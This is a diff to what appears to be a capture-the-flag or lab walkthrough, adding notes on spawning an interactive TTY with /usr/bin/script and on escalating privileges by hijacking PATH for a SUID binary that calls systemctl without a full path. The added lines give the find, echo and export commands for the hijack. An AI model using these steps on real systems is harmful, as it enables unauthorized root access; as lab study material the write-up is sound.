@@ -110,6 +110,33 @@
 
 --------------------
 
-### Spawning interactive tty without python 
+### Spawning interactive tty without python with /usr/bin/script
+
+- Using `/usr/bin/script` to spawn interactive tty
+
+      /usr/bin/script -qc /bin/bash /dev/null
+      ctrl + z
+      stty raw -echo;fg;reset
+
+- Shell
+
+![image](https://github.com/user-attachments/assets/2c6c51f3-3d28-49a8-a291-ae0d39f1bb5c)
+
+### Privesc with $PATH variable
+
+- I found a suid binary with `find / -type f -perm -u=s 2</dev/null` and discovered the `serverManager` binary
+
+![image](https://github.com/user-attachments/assets/92dda248-9c09-4c3e-9c4f-fda42d6ca939)
+
+- Checking the source code shows it does runs systemctl without path being declared e.g `systemctl` instead of `/usr/bin/systemctl`
+
+  ![image](https://github.com/user-attachments/assets/8716fcaf-6e4d-4abb-864f-dc94e3833546)
+
+- I created a systemctl file that spawn `bash` with `echo "/bin/bash" > systemctl` and change the path env variable to check the current directory for binaries with `export PATH=.:$PATH`
+
+  
+
+
+
 
 
